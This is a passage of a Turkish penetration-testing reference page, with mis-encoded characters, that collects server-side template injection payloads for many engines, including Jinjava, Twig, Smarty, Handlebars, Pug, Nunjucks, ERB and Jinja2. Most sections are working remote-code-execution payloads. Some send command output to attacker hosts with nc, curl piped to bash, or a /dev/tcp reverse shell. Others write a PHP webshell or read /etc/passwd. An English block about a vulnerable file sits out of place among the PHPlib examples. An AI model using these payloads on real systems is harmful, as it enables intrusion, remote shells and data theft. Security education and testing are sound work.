- Åablon iÃ§indeki ifadeleri ve fonksiyonlarÄ± gÃ¼venli bir ÅŸekilde deÄŸerlendirmek iÃ§in sÄ±nÄ±rlamalar ve kontroller ekleyin.
- UygulamanÄ±zÄ± dÃ¼zenli olarak gÃ¼ncelleyin ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ± dÃ¼zeltmek iÃ§in gÃ¼ncellemeleri takip edin.

Jinjava tabanlÄ± ÅŸablon enjeksiyonu saldÄ±rÄ±larÄ±na karÅŸÄ± dikkatli olmak ve gÃ¼venlik Ã¶nlemleri almak, web uygulamalarÄ±nÄ±zÄ± saldÄ±rÄ±lara karÅŸÄ± korumak iÃ§in Ã¶nemlidir.
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
Jinjava, Hubspot tarafÄ±ndan geliÅŸtirilen ve [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/) adresinde bulunan aÃ§Ä±k kaynaklÄ± bir projedir.

**Jinjava - Komut yÃ¼rÃ¼tme**

[https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230) ile dÃ¼zeltildi.
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**Daha fazla bilgi**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* `{% %}` ifade ayÄ±rÄ±cÄ±larÄ±
* `{{ }}` ifade ayÄ±rÄ±cÄ±larÄ±
* `{# #}` yorum ayÄ±rÄ±cÄ±larÄ±
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

"com.hubspot.content.hubl.context.TemplateContextRequest" iÃ§in arama yapÄ±n ve [Github'da Jinjava projesini](https://github.com/HubSpot/jinjava/) keÅŸfedin.
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the



{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**Daha fazla bilgi**

* [https://www.betterhacker.com/2018/12/hubl-ile-hubspotda-el-enjeksiyonu-ile-uzaktan-kod-calisitirma.html](https://www.betterhacker.com/2018/12/hubl-ile-hubspotda-el-enjeksiyonu-ile-uzaktan-kod-calisitirma.html)

### Expression Language - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

Expression Language (EL), JavaEE'de sunum katmanÄ± (web sayfalarÄ± gibi) ile uygulama mantÄ±ÄŸÄ± (yÃ¶netilen nesneler gibi) arasÄ±ndaki etkileÅŸimi kolaylaÅŸtÄ±ran temel bir Ã¶zelliktir. Bu iletiÅŸimi optimize etmek iÃ§in EL, birden fazla JavaEE teknolojisinde yaygÄ±n olarak kullanÄ±lÄ±r. EL'i kullanan temel JavaEE teknolojileri ÅŸunlarÄ± iÃ§erir:

- **JavaServer Faces (JSF)**: JSF sayfalarÄ±ndaki bileÅŸenleri ilgili arka uÃ§ veri ve iÅŸlemlere baÄŸlamak iÃ§in EL kullanÄ±r.
- **JavaServer Pages (JSP)**: JSP'de EL, JSP sayfalarÄ± iÃ§indeki verilere eriÅŸmek ve bunlarÄ± manipÃ¼le etmek iÃ§in kullanÄ±lÄ±r, bÃ¶ylece sayfa Ã¶ÄŸelerini uygulama verilerine baÄŸlamak daha kolay hale gelir.
- **Contexts and Dependency Injection for Java EE (CDI)**: EL, web katmanÄ± ile yÃ¶netilen nesneler arasÄ±nda sorunsuz etkileÅŸim saÄŸlamak iÃ§in CDI ile entegre olur, bÃ¶ylece daha tutarlÄ± bir uygulama yapÄ±sÄ± saÄŸlanÄ±r.

**EL yorumlayÄ±cÄ±larÄ±nÄ±n** nasÄ±l sÃ¶mÃ¼rÃ¼leceÄŸi hakkÄ±nda daha fazla bilgi edinmek iÃ§in aÅŸaÄŸÄ±daki sayfayÄ± kontrol edin:

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

AÅŸaÄŸÄ±daki GÃ¼venlik YÃ¶neticisi atlatmalarÄ±, bu [**yazÄ±da**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/) yer alan bilgilerden alÄ±nmÄ±ÅŸtÄ±r.
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) Ä°spanya'daki en ilgili siber gÃ¼venlik etkinliÄŸi ve Avrupa'daki en Ã¶nemli etkinliklerden biridir. Teknik bilginin yayÄ±lmasÄ±nÄ± amaÃ§layan bu kongre, her disiplindeki teknoloji ve siber gÃ¼venlik profesyonelleri iÃ§in kaynayan bir buluÅŸma noktasÄ±dÄ±r.

{% embed url="https://www.rootedcon.com/" %}

##


### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**Daha fazla bilgi**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) adresindeki Smarty bÃ¶lÃ¼mÃ¼nde
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty) adresinde

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = Hata`
* `{{foobar}} HiÃ§bir ÅŸey`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id',""]|sort('system')}}

#Hide warnings and errors for automatic exploitation
{{["error_reporting", "0"]|sort("ini_set")}}
```
**Twig - Åablon formatÄ±**

Twig, PHP tabanlÄ± bir ÅŸablon motorudur. Åablon dosyalarÄ± `.twig` uzantÄ±sÄ±na sahiptir ve HTML veya diÄŸer metin tabanlÄ± belgeleri oluÅŸturmak iÃ§in kullanÄ±lÄ±r. Twig, web uygulamalarÄ±nda dinamik iÃ§erik oluÅŸturmak iÃ§in sÄ±klÄ±kla kullanÄ±lÄ±r.

Twig ÅŸablonlarÄ±, deÄŸiÅŸkenler, if ifadeleri, dÃ¶ngÃ¼ler ve filtreler gibi bir dizi Ã¶zelliÄŸi destekler. Bu Ã¶zellikler, ÅŸablon dosyalarÄ±nda dinamik iÃ§erik oluÅŸturmak iÃ§in kullanÄ±labilir.

Ã–rneÄŸin, bir Twig ÅŸablonunda aÅŸaÄŸÄ±daki gibi bir deÄŸiÅŸken kullanÄ±labilir:

```twig
Merhaba, {{ isim }}!
```

Bu ÅŸablon, `isim` deÄŸiÅŸkeninin deÄŸerine baÄŸlÄ± olarak farklÄ± bir Ã§Ä±ktÄ± Ã¼retecektir. Åablon dosyasÄ± iÅŸlendiÄŸinde, `isim` deÄŸiÅŸkeni yerine geÃ§erli deÄŸeri yerleÅŸtirilir.

Twig, gÃ¼venlik aÃ§Ä±sÄ±ndan dikkate alÄ±nmasÄ± gereken bazÄ± Ã¶nemli noktalara sahiptir. Ã–zellikle, sunucu tarafÄ± ÅŸablon enjeksiyonu (Server-Side Template Injection - SSTI) saldÄ±rÄ±larÄ±na karÅŸÄ± savunmasÄ±z olabilir. Bu tÃ¼r saldÄ±rÄ±lar, kÃ¶tÃ¼ niyetli kullanÄ±cÄ±larÄ±n ÅŸablon dosyalarÄ±na istenmeyen kod enjekte etmesine izin verir ve bu da ciddi gÃ¼venlik sorunlarÄ±na yol aÃ§abilir.

SSTI saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in Twig ÅŸablonlarÄ±nda gÃ¼venli kodlama uygulamalarÄ± kullanÄ±lmalÄ±dÄ±r. Bu, kullanÄ±cÄ± giriÅŸlerinin doÄŸru bir ÅŸekilde iÅŸlendiÄŸinden ve gÃ¼venlik kontrollerinin yapÄ±ldÄ±ÄŸÄ±ndan emin olmayÄ± iÃ§erir. AyrÄ±ca, Twig'in gÃ¼ncel sÃ¼rÃ¼mÃ¼nÃ¼ kullanmak ve gÃ¼venlik dÃ¼zeltmelerini takip etmek de Ã¶nemlidir.

SSTI saldÄ±rÄ±larÄ±na karÅŸÄ± korunmak iÃ§in Twig ÅŸablonlarÄ±nÄ±n gÃ¼venli bir ÅŸekilde kullanÄ±lmasÄ± Ã¶nemlidir. Bu, web uygulamalarÄ±nÄ±n gÃ¼venliÄŸini saÄŸlamak iÃ§in Ã¶nemli bir adÄ±mdÄ±r.
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**Daha fazla bilgi**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) adresindeki Twig ve Twig (Sandboxed) bÃ¶lÃ¼mÃ¼nde
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig) adresinde

### Plates (PHP)

Plates, Twig'den ilham alan ve PHP'ye Ã¶zgÃ¼ bir ÅŸablon motorudur. Ancak, Twig'in yeni bir sÃ¶zdizimi tanÄ±ttÄ±ÄŸÄ±na karÅŸÄ±n, Plates, ÅŸablonlarda yerel PHP kodunu kullanarak PHP geliÅŸtiricileri iÃ§in sezgisel bir yapÄ± sunar.

Controller:
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
Sayfa ÅŸablonu:
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
DÃ¼zen ÅŸablonu:
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
**Daha fazla bilgi**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates)

### PHPlib ve HTML\_Template\_PHPLIB (PHP)

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB), PHPlib ile aynÄ±dÄ±r ancak Pear'a taÅŸÄ±nmÄ±ÅŸtÄ±r.

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
# Server-Side Template Injection (SSTI)

## Authors

This page displays a list of authors. The authors' names are retrieved from a database and rendered on the page using a server-side template.

## Vulnerability

The `authors.php` file is vulnerable to Server-Side Template Injection (SSTI). This vulnerability allows an attacker to inject malicious code into the server-side template, which is then executed on the server.

## Exploitation

To exploit this vulnerability, an attacker can inject template code that will be executed by the server. This can be done by manipulating the input parameters or by directly modifying the template file.

## Impact

Server-Side Template Injection can have serious consequences, including:

- Remote code execution: An attacker can execute arbitrary code on the server, potentially gaining full control over the system.
- Information disclosure: The attacker can access sensitive information stored on the server, such as database credentials or other users' data.
- Denial of Service (DoS): By injecting malicious code, an attacker can cause the server to crash or become unresponsive.

## Prevention

To prevent Server-Side Template Injection, follow these best practices:

- Input validation: Always validate and sanitize user input to prevent malicious code injection.
- Use a secure template engine: Choose a template engine that has built-in protection against SSTI vulnerabilities.
- Least privilege principle: Ensure that the server running the template engine has the minimum necessary privileges to reduce the impact of an attack.
- Regularly update dependencies: Keep all software dependencies up to date to patch any known vulnerabilities.

## References

- [OWASP Server-Side Template Injection](https://owasp.org/www-community/attacks/Server-Side_Template_Injection)
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
**Daha fazla bilgi**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib)

### Jade (NodeJS)
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**Daha fazla bilgi**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) adresindeki Jade bÃ¶lÃ¼mÃ¼nde
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen) adresinde

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template), belgeyi farklÄ± parÃ§alara bÃ¶lmek iÃ§in XML etiketlerini kullanan derlemeyen bir PHP ÅŸablon motorudur.
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
**Daha fazla bilgi**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate)

### Handlebars (NodeJS)

Yol GeÃ§iÅŸi (daha fazla bilgi iÃ§in [buraya](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/) bakÄ±n).
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= Hata
* ${7\*7} = ${7\*7}
* HiÃ§bir ÅŸey
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```
**Daha fazla bilgi**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **Åablon** | **AÃ§Ä±klama**                            |
| ---------- | --------------------------------------- |
|            | DeÄŸerlendir ve Ã§Ä±ktÄ±yÄ± render et         |
|            | DeÄŸerlendir ve HTML kodlu Ã§Ä±ktÄ±yÄ± render et |
|            | Yorum yap                               |
| ve         | Kodu etkinleÅŸtir (varsayÄ±lan olarak devre dÄ±ÅŸÄ±) |

* \= 49

**Ä°stemci TarafÄ±**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**Sunucu TarafÄ±**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**Daha fazla bilgi**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**Ã–rnek sunucu tarafÄ± render**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**Daha fazla bilgi**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = Ã‡Ä±ktÄ± yok
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = Hata
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**Daha fazla bilgi**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (Ruby)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = Hata`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**Daha fazla bilgi**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (Ruby)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**Daha fazla bilgi**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

Python'da **kum havuzlarÄ±nÄ± atlayarak keyfi komut yÃ¼rÃ¼tme hileleri** hakkÄ±nda bilgi edinmek iÃ§in aÅŸaÄŸÄ±daki sayfaya gÃ¶z atÄ±n:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = Hata`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}



{{os.system('whoami')}}
{{os.system('whoami')}}
```
**Daha fazla bilgi**
* [https://ajinabraham.com/blog/server-side-template-injection-in-tornado](https://ajinabraham.com/blog/server-side-template-injection-in-tornado)

### Jinja2 (Python)

[Resmi web sitesi](http://jinja.pocoo.org)

> Jinja2, Python iÃ§in tam Ã¶zellikli bir ÅŸablon motorudur. Tam unicode desteÄŸi, isteÄŸe baÄŸlÄ± entegre edilmiÅŸ bir gÃ¼venli Ã§alÄ±ÅŸma ortamÄ±, yaygÄ±n olarak kullanÄ±lan ve BSD lisanslÄ±dÄ±r.

* `{{7*7}} = Hata`
* `${7*7} = ${7*7}`
* `{{foobar}} HiÃ§bir ÅŸey`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}



{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - Åablon formatÄ±**

Jinja2, Python programlama dilinde kullanÄ±lan bir ÅŸablon motorudur. Åablonlar, dinamik iÃ§erik oluÅŸturmak iÃ§in kullanÄ±lÄ±r ve genellikle web uygulamalarÄ±nda kullanÄ±lÄ±r. Jinja2, basit ve esnek bir sÃ¶zdizimine sahiptir ve HTML, XML, JSON gibi farklÄ± veri formatlarÄ±nÄ± destekler.

Jinja2 ÅŸablonlarÄ±, iki tÃ¼r etiket iÃ§erir: kontrol yapÄ±larÄ± ve deÄŸiÅŸkenler. Kontrol yapÄ±larÄ±, dÃ¶ngÃ¼ler, koÅŸullar ve dizi iÅŸlemleri gibi program akÄ±ÅŸÄ±nÄ± kontrol etmek iÃ§in kullanÄ±lÄ±r. DeÄŸiÅŸkenler ise verileri ÅŸablona yerleÅŸtirmek iÃ§in kullanÄ±lÄ±r.

Ã–rneÄŸin, aÅŸaÄŸÄ±daki Jinja2 ÅŸablonu, bir kullanÄ±cÄ±nÄ±n adÄ±nÄ± ve yaÅŸÄ±nÄ± iÃ§eren bir HTML belgesi oluÅŸturur:

```html
<!DOCTYPE html>
<html>
<head>
    <title>KullanÄ±cÄ± Bilgileri</title>
</head>
<body>
    <h1>Merhaba, {{ user.name }}!</h1>
    <p>YaÅŸÄ±nÄ±z: {{ user.age }}</p>
</body>
</html>
```

Bu ÅŸablon, `user` adÄ±nda bir deÄŸiÅŸkenin `name` ve `age` Ã¶zelliklerini kullanarak dinamik bir HTML belgesi oluÅŸturur. Åablonu kullanÄ±rken, `user` deÄŸiÅŸkeni ÅŸablona verilerek istenen sonuÃ§ elde edilir.

